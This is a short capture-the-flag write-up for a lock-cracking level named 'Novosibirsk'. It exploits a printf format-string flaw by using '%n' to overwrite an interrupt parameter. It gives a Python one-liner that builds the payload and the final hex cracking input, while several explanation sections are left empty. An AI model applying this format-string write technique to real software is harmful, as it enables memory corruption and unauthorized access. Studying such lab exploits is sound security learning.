# Novosibirsk - 40 points
 
## The idea
The weakness of printf - very similar to Addis Ababa challenge. changing a parameter for Interrupt, so that instead of activating one thing, something else will be activated. like opening a door, for example...

## The way
Black box testing tells us that the input to unlock is just a username.

<img src="./12.1.png" width="80%"></img>

Let's look at function `main`:

<img src="./12.2.png"></img>

### Explain the `main`:



### Summary:


### How to exploit:


### Illustration:

The following code constructs the malicious input according to the above requirements:

```python
(b'\xc8\x44' + (0x7f - 0x2) * b'\x11' + b'%n').hex()
```

Stack memory:


The stack immediately after printf:



## The cracking input (as bytes)
```
c844 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 256e
```